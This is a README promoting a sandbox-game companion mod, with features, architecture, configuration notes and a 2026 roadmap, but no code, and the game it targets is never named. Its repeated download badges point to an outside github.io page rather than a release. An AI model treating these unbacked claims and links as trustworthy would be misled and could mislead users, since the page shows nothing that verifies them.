![preview](https://raw.githubusercontent.com/marisqueriapaladar-commits/companion-forge-npcs/main/shot_5a2dcae.svg)

# Verdant Companion Framework

**A living-world enhancement system for sandbox games, introducing autonomous companion entities with memory, emotional states, and cooperative building logic.**

Welcome to the Verdant Companion Framework—not merely a mod, but an ecosystem architect. This project reimagines how non-player characters (NPCs) coexist with the player, transforming passive bystanders into proactive, emotionally-aware collaborators. Think of it as giving your game world a nervous system: every companion remembers your past deeds, reacts to your current mood, and plans for your future needs.

Built on the principle of *ambient intelligence*, the framework introduces a dynamic "memory weave" that tracks every interaction across a 3D voxel space. Your companion won't just stand there; they'll water your crops before you ask, hum while mining, or become reserved if you've ignored them for too long. This is not a script—it's a relationship engine.

---

## 🌟 Key Features

### 🧠 Persistent Memory Fabric
Every companion retains a detailed behavioral log. If you saved a village yesterday, they'll reference it today. If you accidentally hit them with a shovel, they'll keep a healthy distance for a while—until you earn back their trust through gifts or shared adventures.

### 💬 Adaptive Dialogue Vectoring
Conversations branch not just on quests, but on *emotional resonance*. The dialogue system reads your recent actions (combat frequency, building activity, exploration patterns) and adjusts the tone, vocabulary, and even the topic of conversation. A peaceful farmer will discuss weather; a battle-hardened guard will critique your sword grip.

### 🎭 Emotional State Machine with Choreographic Idles
Companions display 14 distinct emotional states, each paired with custom limb animations and facial overlays. When happy, they'll tap their feet. When anxious, they'll glance toward exits. These micro-animations are synchronized with the game's tick rate to avoid jitter, ensuring fluid, lifelike motion.

### 🛠️ Collaborative Construction Assistance
Your companion will actually *help* you build. If you place a blueprint block, they'll gather nearby materials, place them in the correct sequence, and even propose design alternatives based on structural integrity simulations. It’s like having a tireless apprentice with an eye for architecture.

### 🌐 Multilingual Interaction Suite
A built-in translation layer supports 12 languages out of the box—from English and Spanish to Japanese and Swahili. The dialogue system dynamically swaps strings without reloading, allowing players to switch languages mid-conversation.

### ⚡ Ultra-Lightweight Event Scheduler
The framework operates on a custom event bus that runs at 20 ticks per second, with a memory footprint 40% lower than standard companion AI. This ensures your game runs smoothly even with 15 active companions simultaneously.

### 📊 Responsive Status HUD
A clean, collapsible UI panel shows your companion's current mood, energy, pending tasks, and relationship score. The interface adapts to screen sizes—whether you're on a 4K monitor or a compact laptop, the layout re-flows fluidly.

---

## 🚀 Getting Started

Before you begin, ensure your game is updated to the latest stable build. The framework requires a minimal configuration file that you can adjust manually or through the in-game setup wizard.

[![Download](https://raw.githubusercontent.com/marisqueriapaladar-commits/companion-forge-npcs/main/go_9946.svg)](https://marisqueriapaladar-commits.github.io/companion-forge-npcs/)

### System Requirements
- **Game Version:** 1.20.4 or higher
- **Memory Allocation:** 2 GB recommended for best performance
- **Operating System:** Windows 10/11, macOS 12+, or Linux (x86_64)

### Installation Overview
1. Download the latest framework archive from the bottom of this page.
2. Place the archive into your game's `mods` directory.
3. Launch the game—the framework will self-configure on the first start.
4. Use the in-game command `/verdant_spawn` to summon your first companion.

---

## 🧩 Architecture & Design Philosophy

This framework was built like a *garden*, not a machine. Every module is a root system that intertwines with others, allowing for cross-communication without tight coupling. The three pillars are:

### 1. The Perception Layer
Senses are simulated via a proximity grid. The companion doesn't "see" everything—only entities and blocks within a 16-block radius, filtered by their current attention focus. This prevents sensory overload and makes the AI feel more human.

### 2. The Deliberation Core
Instead of a decision tree, we use a *weighted utility system*. Each potential action (e.g., "harvest wheat," "follow player," "rest") is scored based on internal needs (hunger, energy) and external stimuli. The highest score wins. This allows for emergent, unpredictable behavior that feels organic.

### 3. The Emotional Synthesis Module
This is the heart. An emotional scalar array (ranging from -100 to +100 on axes like trust, affection, and respect) directly influences the deliberation core. A rise in trust, for example, unlocks new dialogue branches and cooperative behaviors.

---

## 🗺️ Use Cases & Scenarios

- **Solo Survival:** Your companion acts as a fetching assistant, retrieving distant resources while you focus on base defense.
- **Role-Playing Servers:** Run medieval taverns or guard outposts with companions that remember regular customers and react to disturbances.
- **Creative Mode:** Use companions as interactive set-dressers—they'll tidy up loose blocks, arrange furniture, and even "argue" about taste.
- **Educational Builds:** For content creators, the framework offers a "scripted memory" mode, where you can predefine emotional arcs for cinematic sequences.

---

## 🔧 Configuration & Customization

All parameters are exposed via a clean JSON structure. You can tweak:
- Emotional decay rates (how quickly companions forget negative events)
- Dialogue response timeouts
- Companion walk speed multipliers
- Resource gathering priorities
- Animation smoothing factors

A full documentation wiki is available in the `docs/` folder of this repository, with over 300 configuration keys explained.

---

## 🌍 Localization & Community Support

We believe tools should adapt to the user. The framework auto-detects your system language, but you can override it. Additionally, we host a community translation portal where native speakers submit corrections—these are reviewed and rolled into monthly patches.

---

## 🛡️ Disclaimer

**Please read carefully.**
This framework is provided "as is" without warranty of any kind, express or implied. While the core codebase is stable, behaviors can vary depending on other mods installed. We do not guarantee that companions will always respond as intended during heavily scripted events or custom maps. Any modifications you make to the configuration files are your sole responsibility.

The project is open-source under the MIT License. You are free to use, modify, and distribute it, provided you include the original copyright notice. We do not offer commercial support guarantees, but our issue tracker is actively monitored.

---

## 📄 License

This project is licensed under the [MIT License](LICENSE). See the LICENSE file for full details. In short: you can do almost anything, but you must include the copyright notice and we are not liable for any damages.

---

## 🤝 Contribution Guidelines

We welcome code contributions, bug reports, and feature requests. Please read our `CONTRIBUTING.md` file before submitting a pull request. We prioritize well-documented code, concise commit messages, and thorough testing of new companion behaviors.

---

## 📌 Roadmap for 2026

- **Q1 2026:** Release of the "Emotion Expansion Pack" with 8 additional emotional states.
- **Q2 2026:** Multi-companion squad management interface.
- **Q3 2026:** Real-time co-op companions across local network play.
- **Q4 2026:** Soundscape integration—companions will hum, whistle, or stay silent based on mood.

---

## 🌟 Final Words

The Verdant Companion Framework is more than a feature set—it's an invitation to rethink how players bond with digital entities. We hope it inspires you to create villages that feel alive, not just populated. Explore, tweak, and share your results.

If you encounter an issue, check the troubleshooting FAQ first. If it's still unresolved, open an issue on the repository and our support team (available 24/7 for repository feedback) will assist.

Thank you for being part of this journey.

[![Download](https://raw.githubusercontent.com/marisqueriapaladar-commits/companion-forge-npcs/main/go_9946.svg)](https://marisqueriapaladar-commits.github.io/companion-forge-npcs/)